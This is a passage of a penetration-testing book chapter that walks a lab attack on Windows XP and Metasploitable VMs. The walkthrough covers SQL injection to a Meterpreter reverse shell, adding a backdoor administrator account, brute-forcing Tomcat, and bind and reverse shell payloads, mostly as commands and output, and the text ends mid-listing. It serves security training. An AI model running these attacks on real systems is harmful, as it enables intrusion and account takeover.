@@ -1,0 +1,308 @@
+<html><head></head><body><section epub:type="chapter" id="simulated_penetration_test"><div class="titlepage"><div class="book"><div class="book"><h2 class="title1">Chapter 17. Simulated Penetration Test</h2></div></div></div><p class="calibre2">Penetration testing is the pinnacle for most of us, and successfully bypassing an organization’s defenses during a penetration test is one of our most rewarding experiences. In this chapter, we’ll pull together what you’ve learned in previous chapters as we simulate a complete penetration test. You will be re-creating steps that you’ve seen in previous chapters, so most of what is shown here should be familiar.<a id="IDX-CHP-17-0001" class="strong"/><a id="IDX-CHP-17-0002" class="strong"/><a id="IDX-CHP-17-0003" class="strong"/></p><p class="calibre2">Before you begin, download and install Metasploit’s vulnerable Linux virtual machine called <span class="strong"><em class="calibre4">Metasploitable</em></span>. (You can find it at <a class="xref" href="http://www.thepiratebay.org/torrent/5573179/Metasploitable/" target="_top">http://www.thepiratebay.org/torrent/5573179/Metasploitable/</a>.) Metasploitable was created to train individuals to use Metasploit for successful exploitation. Follow the directions on the site to install Metasploitable, and then power it on. We’ll be running the Metasploitable virtual machine alongside the Windows XP system <a class="xref" href="http://www.exploit-db.com/exploits/5720/" target="_top">to simulate a small networked</a> environment, with one virtual machine acting as an Internet-facing system and another acting as an internal network host.<a id="IDX-CHP-17-0004" class="strong"/><a id="IDX-CHP-17-0005" class="strong"/></p><div class="book"><hr class="calibre5"/></div><div class="note"><h3 class="title4">Note</h3><p class="calibre2">The simulated penetration test in this chapter is a small one. You would do something more in-depth if your target were a large corporation. We’ve kept this simple to make it easy for you to replicate.<a id="IDX-CHP-17-0006" class="strong"/><a id="IDX-CHP-17-0007" class="strong"/></p></div><div class="book"><hr class="calibre5"/></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="pre-engagement_interactions-id1">Pre-engagement Interactions</h2></div></div></div><p class="calibre2">Planning is the first step in pre-engagement. During a true planning phase, we would identify our target(s) and our primary method of planned attack, which might include social engineering, wireless, Internet, or internal attack vectors. Unlike an actual penetration test, here we will not be targeting a specific organization or a group of systems; we will perform a simulation using our known virtual machine.<a id="IDX-CHP-17-0008" class="strong"/></p><p class="calibre2">For the purposes of this simulation, our target will be the protected Metasploitable virtual machine at IP address 172.16.32.162 (to configure Metasploitable, use the username and password of <span class="strong"><em class="calibre4">msfadmin</em></span>). The Metasploitable target is a machine attached to an internal network, protected by a firewall, and <span class="strong"><em class="calibre4">not</em></span> directly connected to the Internet. Our Windows XP machine is behind the firewall (turn on Windows Firewall) with only port 80 open at IP address 172.16.32.131.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="intelligence_gathering-id2">Intelligence Gathering</h2></div></div></div><p class="calibre2">The next step, intelligence gathering, is one of the most important phases in the process, because if you miss something here you might miss an entire avenue of attack. Our goal at this point is to understand what we are going to attack and determine how we might gain access to the system.</p><p class="calibre2">We begin with a basic <span class="strong"><em class="calibre4">nmap</em></span> scan (as shown next) against our Windows XP virtual machine, and we find that port 80 is open. We use <span class="strong"><em class="calibre4">nmap</em></span>’s stealth TCP scan, which is typically effective in detecting ports without triggering defenses. Most IPSs can detect port scans, but because port scans are so common, they are generally considered regular noise and are ignored as long as they’re not very aggressive.<a id="IDX-CHP-17-0009" class="strong"/><a id="IDX-CHP-17-0010" class="strong"/></p><a id="I_programlisting17_d1e19521" class="strong"/><pre class="programlisting">root@bt:/# <strong class="calibre3"><code class="calibre6">nmap -sT -P0 172.16.32.131</code></strong>
+
+Starting Nmap 5.21 ( http://nmap.org ) at 2011-05-22 23:29 EDT
+Nmap scan report for 172.16.32.131
+Host is up (0.00071s latency).
+Not shown: 999 filtered ports
+PORT   STATE SERVICE
+<strong class="calibre3"><code class="calibre6">80/tcp open  http</code></strong>
+
+Nmap done: 1 IP address (1 host up) scanned in 17.46 seconds</pre><p class="calibre2">We discover what appears to be a web server running on this server. This is typical when attacking Internet-facing systems, most of which will limit the ports accessible by Internet users. In this example, we find port 80, the standard HTTP port, listening. If we browse to it, we see something similar to <a class="xref" href="part0021.html#a_web_application_was_identified">Figure 17-1</a>.<a id="IDX-CHP-17-0011" class="strong"/></p><div class="figure"><a id="a_web_application_was_identified" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject17_d1e19539" class="strong"/><img src="../images/00060.jpeg" alt="A web application was identified." hisrc="httpatomoreillycomsourcenostarchimages867574.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 17-1. A web application was identified.</div></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="threat_modeling-id1">Threat Modeling</h2></div></div></div><p class="calibre2">Having identified port 80 as open, we could enumerate any available additional systems, but we’re interested only in the single target. Let’s move on to threat modeling and attempt to identify the best route into this system.<a id="IDX-CHP-17-0012" class="strong"/><a id="IDX-CHP-17-0013" class="strong"/></p><p class="calibre2">The web page we found gives us a chance to enter input in User and Password fields. At this point, you, as a penetration tester, should think outside the box and try to determine what the best avenue is going to be. When you’re performing application security penetration tests, consider using tools other than Metasploit, such as the Burp Suite (<a class="xref" href="http://www.portswigger.net/" target="_top">http://www.portswigger.net/</a>) when appropriate; don’t feel locked into a single tool set. In the following example, we’ll attempt a manual attack by entering <span class="bolditalic">‘TEST</span> (notice the leading single quote) into the username field and a single quote in the password field. Prior to submitting the form, our username and password fields should look like those in <a class="xref" href="part0021.html#attempting_to_leverage_sql_injection">Figure 17-2</a>.<a id="IDX-CHP-17-0014" class="strong"/></p><div class="figure"><a id="attempting_to_leverage_sql_injection" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject17_d1e19576" class="strong"/><img src="../images/00061.jpeg" alt="Attempting to leverage SQL injection" hisrc="httpatomoreillycomsourcenostarchimages867576.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 17-2. Attempting to leverage SQL injection</div></div><p class="calibre2">Take a moment to consider what is occurring on the backend when the server receives this input. Here we simply tried to start a new SQL statement and appended some bogus data to it. You probably won’t find many web applications in the wild that are as easy to attack as this one, but this makes for a good example — and it was not too long ago that these sorts of errors were in fact being discovered all the time. When we click the Submit button, we get the error message shown in <a class="xref" href="part0021.html#error_message_colon_sql_injection_is_pre">Figure 17-3</a>.</p><p class="calibre2">This error message indicates that a SQL injection flaw is present based on the SQL exception and the “Incorrect syntax near” message shows that the <span class="strong"><em class="calibre4">‘TEST</em></span> input caused it. With a quick Google search, we can determine that the backend database is Microsoft SQL, purely based on the error messages that were presented.<a id="IDX-CHP-17-0015" class="strong"/></p><p class="calibre2">We won’t go into how to perform SQL injection on web applications here, but you can easily manipulate the input parameters to attack a given system and completely compromise it. (This was covered briefly in <a class="xref" href="part0015.html#fast-track">Chapter 11</a>.) Notice that we still haven’t actually attacked a system yet; we’ve simply tried to identify a viable attack vector in the system. Now that we know we can potentially compromise this system, it’s time to move on to the exploitation phase.</p><div class="figure"><a id="error_message_colon_sql_injection_is_pre" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject17_d1e19600" class="strong"/><img src="../images/00062.jpeg" alt="Error message: SQL injection is present." hisrc="httpatomoreillycomsourcenostarchimages867578.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 17-3. Error message: SQL injection is present.</div></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="exploitation-id1">Exploitation</h2></div></div></div><p class="calibre2">When we looked for vulnerabilities in the web application, we found a viable attack vector via SQL injection. In this instance, Fast-Track is our best option for compromising the MS SQL server and gaining access to our target through Meterpreter, because, as you’ll recall from <a class="xref" href="part0015.html#fast-track">Chapter 11</a>, it attacks Microsoft SQL–based injection vulnerabilities with ease.<a id="IDX-CHP-17-0016" class="strong"/><a id="IDX-CHP-17-0017" class="strong"/><a id="IDX-CHP-17-0018" class="strong"/><a id="IDX-CHP-17-0019" class="strong"/><a id="IDX-CHP-17-0020" class="strong"/><a id="IDX-CHP-17-0021" class="strong"/><a id="IDX-CHP-17-0022" class="strong"/><a id="IDX-CHP-17-0023" class="strong"/></p><p class="calibre2">After we have a Meterpreter console, we’ll look at how to gain access to the Metasploitable system on the internal network.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="customizing_msfconsole">Customizing MSFconsole</h2></div></div></div><p class="calibre2">We’ll use SQLPwnage to deploy the Meterpreter console via SQL injection on the target to gain administrative access to its backend database. Recall from <a class="xref" href="part0015.html#fast-track">Chapter 11</a> that SQLPwnage is an automated way of attacking MS SQL–based injection flaws, and it uses multiple methods of attack in an attempt to fully compromise the SQL server via the <code class="literal">xp_cmdshell</code> stored procedure.</p><p class="calibre2">Before launching the attack, we need to set up some options through <span class="strong"><em class="calibre4">msfconsole</em></span>. For practice, let’s create our own Metasploit listener manually. Fast-Track can set it up for you, but we will be adding the <code class="literal">load auto_add_route</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject17_d1e19668" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> function within Metasploit so that we can automatically connect to systems on the internal network. We’ll create a listener and launch Fast-Track to attack the system.<a id="IDX-CHP-17-0024" class="strong"/><a id="IDX-CHP-17-0025" class="strong"/><a id="IDX-CHP-17-0026" class="strong"/></p><a id="I_programlisting17_d1e19683" class="strong"/><pre class="programlisting">root@bt:/opt/framework3/msf3# <strong class="calibre3"><code class="calibre6">msfconsole</code></strong>
+  msf &gt; <strong class="calibre3"><code class="calibre6">use multi/handler</code></strong>
+  msf exploit(handler) &gt; <strong class="calibre3"><code class="calibre6">set payload windows/meterpreter/reverse_tcp</code></strong>
+  payload =&gt; windows/meterpreter/reverse_tcp
+  msf exploit(handler) &gt; <strong class="calibre3"><code class="calibre6">set LHOST 172.16.32.129</code></strong>
+  LHOST =&gt; 172.16.32.129
+  smsf exploit(handler) &gt; <strong class="calibre3"><code class="calibre6">set LPORT 443</code></strong>
+  LPORT =&gt; 443
+<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> exploit(handler) &gt; <strong class="calibre3"><code class="calibre6">load auto_add_route</code></strong>
+  [*] Successfully loaded plugin: auto_add_route
+  msf exploit(handler) &gt; <strong class="calibre3"><code class="calibre6">exploit -j</code></strong>
+  [*] Exploit running as background job.
+  [*] Started reverse handler on 172.16.32.129:443
+  [*] Starting the payload handler...
+  msf exploit(handler) &gt;</pre><p class="calibre2">With our listener waiting for a connection from our soon-to-be compromised target, we launch Fast-Track. (When the <span class="strong"><em class="calibre4">xterm</em></span> window opens, close it since we already have a listener set up.)</p><a id="I_programlisting17_d1e19718" class="strong"/><pre class="programlisting">[+] Importing 64kb debug bypass payload into Fast-Track... [+]
+[+] Import complete, formatting the payload for delivery.. [+]
+[+] Payload Formatting prepped and ready for launch. [+]
+[+] Executing SQL commands to elevate account permissions. [+]
+[+] Initiating stored procedure: 'xp_cmdhshell' if disabled. [+]
+[+] Delivery Complete. [+]
+Launching MSFCLI Meterpreter Handler
+Creating Metasploit Reverse Meterpreter Payload..
+Created by msfpayload (http://www.metasploit.com).
+Payload: windows/meterpreter/reverse_tcp
+ Length: 290
+Options: LHOST=172.16.32.129,LPORT=443
+Taking raw binary and converting to hex.
+Raw binary converted to straight hex.
+[+] Bypassing Windows Debug 64KB Restrictions. Evil. [+]
+[+] Sending chunked payload. Number 1 of 9. This may take a bit. [+]
+[+] Sending chunked payload. Number 2 of 9. This may take a bit. [+]
+
+<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>
+
+[+] Conversion from hex to binary in progress. [+]
+[+] Conversion complete. Moving the binary to an executable. [+]
+[+] Splitting the hex into 100 character chunks [+]
+[+] Split complete. [+]
+[+] Prepping the payload for delivery. [+]
+Sending chunk 1 of 8, this may take a bit...
+Sending chunk 2 of 8, this may take a bit...
+
+<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>
+
+Using H2B Bypass to convert our Payload to Binary..
+Running cleanup before launching the payload....
+[+] Launching the PAYLOAD!! This may take up to two or three minutes. [+]</pre><p class="calibre2">This should look familiar. We’ve essentially attacked the web application through Fast-Track and exploited it via SQL injection attacks. We used the <code class="literal">xp_cmdshell</code> stored procedure and the binary-to-hex conversion technique to present a full-fledged Meterpreter shell.<a id="IDX-CHP-17-0027" class="strong"/><a id="IDX-CHP-17-0028" class="strong"/><a id="IDX-CHP-17-0029" class="strong"/><a id="IDX-CHP-17-0030" class="strong"/><a id="IDX-CHP-17-0031" class="strong"/><a id="IDX-CHP-17-0032" class="strong"/><a id="IDX-CHP-17-0033" class="strong"/><a id="IDX-CHP-17-0034" class="strong"/></p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="post_exploitation-id1">Post Exploitation</h2></div></div></div><p class="calibre2">At this point, we should have a Meterpreter console running in the background within <span class="strong"><em class="calibre4">msfconsole</em></span>, so we can begin to scan the target’s subnet for other live systems. To do this, we’ll upload <span class="strong"><em class="calibre4">nmap</em></span> to the target and run it from the Windows machine.<a id="IDX-CHP-17-0035" class="strong"/></p><p class="calibre2">First, download <span class="strong"><em class="calibre4">nmap</em></span> from <a class="xref" href="http://insecure.org" target="_top">insecure.org</a> in an executable format and save it locally. We’ll be uploading this to our target. Next, we’ll connect to the target via Microsoft’s Remote Desktop Protocol (RDP), a built-in graphical remote administration protocol that lets you interact with the Windows Desktop as if you were sitting in front of the remote machine. After we’re connected with our Meterpreter session, we’ll use the <span class="strong"><em class="calibre4">getgui</em></span> Meterpreter script to tunnel RDP back out to us over port 8080 and add a new administrative user to the system.<a id="IDX-CHP-17-0036" class="strong"/></p><p class="calibre2">We enter <span class="strong"><strong class="calibre3">rdesktop localhost:8080</strong></span> from Back|Track’s command line, so we can log into the system with the newly created user account. We then use Meterpreter to upload <span class="strong"><em class="calibre4">nmap</em></span> to the target. Our goal is to install <span class="strong"><em class="calibre4">nmap</em></span> on the compromised Windows target and use the system as a staging ground for further attacks. Conversely you could use <span class="strong"><em class="calibre4">scanner/portscan/syn</em></span> and <span class="strong"><em class="calibre4">scanner/portscan/tcp</em></span> to port scan directly through Metasploit. The choice is a matter of personal preference and needs.</p><a id="I_programlisting17_d1e19804" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">run getgui -e -f 8080</code></strong>
+[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
+[*] Carlos Perez carlos_perez@darkoperator.com
+[*] Enabling Remote Desktop
+[*] RDP is already enabled
+[*] Setting Terminal Services service startup mode
+[*] Terminal Services service is already set to auto
+[*] Opening port in local firewall if necessary
+[*] Starting the port forwarding at local port 8080
+[*] Local TCP relay created: 0.0.0.0:8080 &lt;-&gt; 127.0.0.1:3389
+meterpreter &gt; <strong class="calibre3"><code class="calibre6">shell</code></strong>
+Process 2480 created.
+Channel 6 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32&gt;<strong class="calibre3"><code class="calibre6">net user msf metasploit /add</code></strong>
+net user msf metasploit /ADD
+The command completed successfully.
+C:\WINDOWS\system32&gt;<strong class="calibre3"><code class="calibre6">net localgroup administrators msf /add</code></strong>
+net localgroup administrators msf /add
+The command completed successfully.
+C:\WINDOWS\system32&gt;
+C:\WINDOWS\system32&gt;<strong class="calibre3"><code class="calibre6">^Z</code></strong>
+Background channel 6? [y/N]  y
+meterpreter &gt; <strong class="calibre3"><code class="calibre6">upload nmap.exe</code></strong>
+[*] uploading  : nmap.exe -&gt; nmap.exe
+[*] uploaded   : nmap.exe -&gt; nmap.exe
+meterpreter &gt;</pre><p class="calibre2">We now have our launching pad for additional attacks. With <span class="strong"><em class="calibre4">nmap</em></span> installed on the target, we are essentially sitting on the internal network. We can now attempt to enumerate internally connected systems and further penetrate the network.<a id="IDX-CHP-17-0037" class="strong"/><a id="IDX-CHP-17-0038" class="strong"/><a id="IDX-CHP-17-0039" class="strong"/></p><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="scanning_the_metasploitable_system">Scanning the Metasploitable System</h3></div></div></div><p class="calibre2">With our Meterpreter session granting us access to the internal network via the <code class="literal">load auto_add_route</code> command, we can scan and exploit the inside hosts using the compromised Windows XP target as the launching point. We’re effectively connected to the internal network, so we should be able to reach our Metasploitable system. Let’s begin with a basic port scan.<a id="IDX-CHP-17-0040" class="strong"/></p><a id="I_programlisting17_d1e19856" class="strong"/><pre class="programlisting"><strong class="calibre3"><code class="calibre6">nmap.exe -sT -A -P0 172.16.32.162</code></strong>
+
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         ProFTPD 1.3.1
+|_ftp-bounce: no banner
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey: 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+|_2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+23/tcp   open  telnet      Linux telnetd
+25/tcp   open  smtp        Postfix smtpd
+53/tcp   open  domain      ISC BIND 9.4.2
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/
+5.2.4-2ubuntu5.10 with Suhosin-Patch)
+|_html-title: Site doesn't have a title (text/html).
+139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+5432/tcp open  postgresql  PostgreSQL DB
+8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+|_html-title: Apache Tomcat/5.5
+|_http-favicon: Apache Tomcat
+MAC Address: 00:0C:29:39:12:B2 (VMware)
+No exact OS matches for host (If you know what OS is running on it,
+ see http://nmap.org/submit/ ).
+Network Distance: 1 hop
+Service Info: Host:  metasploitable.localdomain; OSs: Unix, Linux
+
+Host script results:
+|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user:
+ &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt;
+| smb-os-discovery:
+|   OS: Unix (Samba 3.0.20-Debian)
+|   Name: WORKGROUP\Unknown
+|_  System time: 2010-05-21 22:28:01 UTC-4
+
+OS and Service detection performed. Please report any incorrect
+ results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 60.19 seconds</pre><p class="calibre2">Here we see a series of open ports. Based on <span class="strong"><em class="calibre4">nmap</em></span>’s OS detection we see that the scanned system is a UNIX/Linux variant of some sort. Some of these ports should jump out at you, such as FTP, Telnet, HTTP, SSH, Samba, MySQL, PostgreSQL, and Apache.<a id="IDX-CHP-17-0041" class="strong"/><a id="IDX-CHP-17-0042" class="strong"/><a id="IDX-CHP-17-0043" class="strong"/><a id="IDX-CHP-17-0044" class="strong"/></p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="identifying_vulnerable_services">Identifying Vulnerable Services</h3></div></div></div><p class="calibre2">Because a few ports look interesting, we’ll start banner-grabbing each one to try to find a way into the system.</p><a id="I_programlisting17_d1e19886" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">use auxiliary/scanner/ftp/ftp_version</code></strong>
+msf auxiliary(ftp_version) &gt; <strong class="calibre3"><code class="calibre6">set RHOSTS 172.16.32.162</code></strong>
+RHOSTS =&gt; 172.16.32.162
+msf auxiliary(ftp_version) &gt; <strong class="calibre3"><code class="calibre6">run</code></strong>
+
+[*] 172.16.32.162:21 FTP Banner: '220
+ <strong class="calibre3"><code class="calibre6">ProFTPD 1.3.1</code></strong> Server (Debian) [::ffff:172.16.32.162]\x0d\x0a'
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(ftp_version) &gt;</pre><p class="calibre2">Exiting the system, we know now that ProFTPD 1.3.1 is running on port 21. Next we use SSH to learn more about the target. (The addition of the <code class="literal">-v</code> flag gives us verbose output.) The next listing tells us that our target is running an older version of OpenSSH, specifically written for Ubuntu:<a id="IDX-CHP-17-0045" class="strong"/><a id="IDX-CHP-17-0046" class="strong"/><a id="IDX-CHP-17-0047" class="strong"/></p><a id="I_programlisting17_d1e19914" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">ssh 172.16.32.162 -v</code></strong>
+[*] exec: ssh 172.16.32.162 -v
+
+<strong class="calibre3"><code class="calibre6">OpenSSH_5.1p1 Debian-3ubuntu1, OpenSSL 0.9.8g 19 Oct 2007</code></strong></pre><p class="calibre2">Now we issue the following to determine the version of Ubuntu running on this system:<a id="IDX-CHP-17-0048" class="strong"/><a id="IDX-CHP-17-0049" class="strong"/><a id="IDX-CHP-17-0050" class="strong"/><a id="IDX-CHP-17-0051" class="strong"/><a id="IDX-CHP-17-0052" class="strong"/><a id="IDX-CHP-17-0053" class="strong"/></p><a id="I_programlisting17_d1e19943" class="strong"/><pre class="programlisting">msf auxiliary(telnet_version) &gt; <strong class="calibre3"><code class="calibre6">set RHOSTS 172.16.32.162</code></strong>
+RHOSTS =&gt; 172.16.32.162
+msf auxiliary(telnet_version) &gt; <strong class="calibre3"><code class="calibre6">run</code></strong>
+
+[*] 172.16.32.162:23 TELNET <strong class="calibre3"><code class="calibre6">Ubuntu 8.04</code></strong>\x0ametasploitable login:
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(telnet_version) &gt;</pre><p class="calibre2">Great! We know that the system is running Ubuntu 8.04 and that two unencrypted protocols (telnet and FTP) are in use that might come into play later.</p><p class="calibre2">Now let’s look at SMTP to see what version our target is running. Remember that we are trying to identify the running versions of the services operating on the various remote systems.</p><a id="I_programlisting17_d1e19958" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">use auxiliary/scanner/smtp/smtp_version</code></strong>
+msf auxiliary(smtp_version) &gt; <strong class="calibre3"><code class="calibre6">set RHOSTS 172.16.32.162</code></strong>
+RHOSTS =&gt; 172.16.32.162
+msf auxiliary(smtp_version) &gt; <strong class="calibre3"><code class="calibre6">run</code></strong>
+
+[*] 172.16.32.162:25 SMTP 220 metasploitable.localdomain ESMTP
+ <strong class="calibre3"><code class="calibre6">Postfix</code></strong> (Ubuntu)\x0d\x0a
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(smtp_version) &gt;</pre><p class="calibre2">As you can see, the Postfix mail server appears to be running on the Metasploitable server.<a id="IDX-CHP-17-0054" class="strong"/></p><p class="calibre2">This process is continued through all the different ports that have been discovered as listening on our target. The various auxiliary modules are very useful for this work. When you’re finished, you should have a list of the versions of software running on the system, information that you will use when targeting attacks.</p></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="attacking_apache_tomcat">Attacking Apache Tomcat</h2></div></div></div><p class="calibre2">Now we enter the attack phase again, where we start to get our hands dirty.</p><p class="calibre2">In the course of our research, we noticed a plethora of vulnerabilities on this system, including direct exploits and brute force possibilities. Now, if we were performing an overt penetration test, we could run vulnerability scanners against the system to find most openings for us, but that would take all the fun out of it! Let’s attack Apache instead.</p><p class="calibre2">We notice that Apache Tomcat is installed on port 8180, as shown in our earlier port scans. After a bit of Internet research, we learn that Tomcat is vulnerable to a management interface brute force attack. (In most cases, we can use <span class="strong"><em class="calibre4">exploit-db</em></span> or Google to identify potential vulnerabilities in a given service.) After some more research on the operating version number of the Apache Tomcat installation running on the target, the Tomcat manager seemed the best route for compromising the system. If we can get through Tomcat’s manager function, we can use the HTTP <code class="literal">PUT</code> method to deploy our payload on the vulnerable system. We launch the attack as follows (with the list of exploits and payloads snipped):<a id="IDX-CHP-17-0055" class="strong"/><a id="IDX-CHP-17-0056" class="strong"/><a id="IDX-CHP-17-0057" class="strong"/></p><a id="I_programlisting17_d1e20006" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">search apache</code></strong>
+[*] Searching loaded modules for pattern 'apache'...
+
+<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>
+
+msf auxiliary(tomcat_mgr_login) &gt;  <strong class="calibre3"><code class="calibre6">set RHOSTS 172.16.32.162</code></strong>
+RHOSTS =&gt; 172.16.32.162
+smsf auxiliary(tomcat_mgr_login) &gt; <strong class="calibre3"><code class="calibre6">set THREADS 50</code></strong>
+THREADS =&gt; 50
+msf auxiliary(tomcat_mgr_login) &gt;  <strong class="calibre3"><code class="calibre6">set RPORT 8180</code></strong>
+RPORT =&gt; 8180
+msf auxiliary(tomcat_mgr_login) &gt;  <strong class="calibre3"><code class="calibre6">set VERBOSE false</code></strong>
+VERBOSE =&gt; false
+emsf auxiliary(tomcat_mgr_login) &gt; <strong class="calibre3"><code class="calibre6">run</code></strong>
+
+[+] http://172.16.32.162:8180/manager/html [Apache-Coyote/1.1]
+ [Tomcat Application Manager]
+successful login 'tomcat' : 'tomcat'
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(tomcat_mgr_login) &gt;</pre><p class="calibre2">Our brute force attack is successful, and it logs in with the username <span class="strong"><em class="calibre4">tomcat</em></span> and password <span class="strong"><em class="calibre4">tomcat</em></span>. But we don’t yet have a shell.</p><p class="calibre2">With our newly discovered credentials, we leverage Apache’s HTTP <code class="literal">PUT</code> functionality with the <span class="strong"><em class="calibre4">multi/http/tomcat_mgr_deploy</em></span> exploit to place our payload on the system using the valid username and password that we discovered by brute-forcing the login.</p><a id="I_programlisting17_d1e20046" class="strong"/><pre class="programlisting">auxiliary(tomcat_mgr_login) &gt; <strong class="calibre3"><code class="calibre6">use multi/http/tomcat_mgr_deploy</code></strong>
+msf exploit(tomcat_mgr_deploy) &gt; <strong class="calibre3"><code class="calibre6">set password tomcat</code></strong>
+password =&gt; tomcat
+msf exploit(tomcat_mgr_deploy) &gt; <strong class="calibre3"><code class="calibre6">set username tomcat</code></strong>
+username =&gt; tomcat
+msf exploit(tomcat_mgr_deploy) &gt; <strong class="calibre3"><code class="calibre6">set RHOST 172.16.32.162</code></strong>
+RHOST =&gt; 172.16.32.162
+msf exploit(tomcat_mgr_deploy) &gt; <strong class="calibre3"><code class="calibre6">set LPORT 9999</code></strong>
+LPORT =&gt; 9999
+Msf exploit(tomcat_mgr_deploy) &gt; <strong class="calibre3"><code class="calibre6">set RPORT 8180</code></strong>
+RPORT =&gt; 8180
+msf exploit(tomcat_mgr_deploy) &gt; <strong class="calibre3"><code class="calibre6">set payload linux/x86/shell_bind_tcp</code></strong>
+payload =&gt; linux/x86/shell_bind_tcp
+msf exploit(tomcat_mgr_deploy) &gt; <strong class="calibre3"><code class="calibre6">exploit</code></strong>
+[*] Using manually select target "Linux X86"
+[*] Uploading 1669 bytes as FW36owipzcnHeUyIUaX.war ...
+[*] Started bind handler
+[*] Executing /FW36owipzcnHeUyIUaX/UGMIdfFjVENQOp4VveswTlma.jsp...
+[*] Undeploying FW36owipzcnHeUyIUaX ...
+[*] Command shell session 1 opened (172.16.32.129:43474 -&gt;
+ 172.16.32.162:9999) at 2010-05-21 23:57:47 −0400msf
+<strong class="calibre3"><code class="calibre6">ls</code></strong>
+bin
+boot
+cdrom
+dev
+etc
+home
+initrd
+initrd.img
+lib
+lost+found
+media
+mnt
+opt
+proc
+root
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+<strong class="calibre3"><code class="calibre6">whoami</code></strong>
+tomcat55
+<strong class="calibre3"><code class="calibre6">ls /root</code></strong>
+reset_logs.sh
+<strong class="calibre3"><code class="calibre6">mkdir /root/moo.txt</code></strong>
+mkdir: cannot create directory '/root/moo.txt': Permission denied</pre><p class="calibre2">Notice that we cannot write to the root folder, because we’re running from a limited user account and this folder requires root-level permissions. Usually, Apache runs under the Apache user account, which is sometimes <span class="strong"><em class="calibre4">apache</em></span> but which can also be <span class="strong"><em class="calibre4">httpd</em></span>, <span class="strong"><em class="calibre4">www-data</em></span>, among other names. Based on what we know about the operating system version in use on the target, we could use local privilege escalation techniques to gain further access as root. Because we already have some basic access, let’s try a couple of different attacks.<a id="IDX-CHP-17-0058" class="strong"/></p><div class="book"><hr class="calibre5"/></div><div class="note"><h3 class="title4">Note</h3><p class="calibre2">Here’s a little hint in obtaining root access to Metasploitable, without privilege escalation: Check out <a class="xref" href="http://www.exploit-db.com/exploits/5720/" target="_top">http://www.exploit-db.com/exploits/5720/</a> for the SSH predictable PRNG exploit.<a id="IDX-CHP-17-0059" class="strong"/><a id="IDX-CHP-17-0060" class="strong"/></p></div><div class="book"><hr class="calibre5"/></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="attacking_obscure_services">Attacking Obscure Services</h2></div></div></div><p class="calibre2">When we performed only the default <span class="strong"><em class="calibre4">nmap</em></span> port scan, we did not include all possible ports. Because we have now gained initial access to the system, we enter <strong class="calibre3"><code class="calibre6">netstat -antp</code></strong>, and we notice other ports that <span class="strong"><em class="calibre4">nmap</em></span> did not scan for when performing the attack. (Remember that in a penetration test we can’t always rely on the defaults to be successful.)</p><p class="calibre2">Our scan finds that port 3632 is open and associated with <span class="strong"><em class="calibre4">DistCC</em></span>. An online search tells us that <span class="strong"><em class="calibre4">DistCC</em></span> is a program that distributes builds of C/C++ code to several machines across a network, and it is vulnerable to an attack. (When performing penetration tests, you will often encounter unfamiliar applications and products, and you will need to research the application before you can attack it.)<a id="IDX-CHP-17-0061" class="strong"/></p><a id="I_programlisting17_d1e20139" class="strong"/><pre class="programlisting">msf exploit(distcc_exec) &gt; <strong class="calibre3"><code class="calibre6">set payload linux/x86/shell_reverse_tcp</code></strong>
+payload =&gt; linux/x86/shell_reverse_tcp
